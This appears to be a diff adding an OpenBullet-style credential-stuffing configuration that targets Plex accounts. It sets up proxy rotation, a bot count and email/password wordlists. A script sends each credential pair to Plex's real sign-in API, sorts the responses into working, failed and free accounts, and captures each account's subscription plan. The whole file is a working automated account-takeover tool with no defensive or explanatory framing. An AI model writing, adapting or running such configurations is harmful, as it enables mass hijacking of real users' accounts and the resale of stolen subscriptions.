@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "Plex",
+  "SuggestedBots": 75,
+  "LastModified": "2019-04-03T05:16:38.5931561-04:00",
+  "AdditionalInfo": "",
+  "Author": "Ari",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://plex.tv/api/v2/users/signin?X-Plex-Product=Plex%20Auth%20App&X-Plex-Version=Unknown&X-Plex-Client-Identifier=dad49fe2-f9b5-5369-bbb7-2a33e5fdcc62&X-Plex-Platform=Chrome&X-Plex-Platform-Version=66.0&X-Plex-Device=Windows&X-Plex-Device-Name=Plex%20Auth%20App%20%28Chrome%29&X-Plex-Device-Screen-Resolution=1366x637%2C1366x768" 
+  CONTENT "login=<USER>&password=<PASS>&rememberMe=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Referer: https://app.plex.tv/" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"Active\"" 
+  KEYCHAIN Failure OR 
+    KEY "User could not be authenticated" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "active\":false" 
+PARSE "<SOURCE>" LR "\"plan\":" "," -> CAP "Plan" 
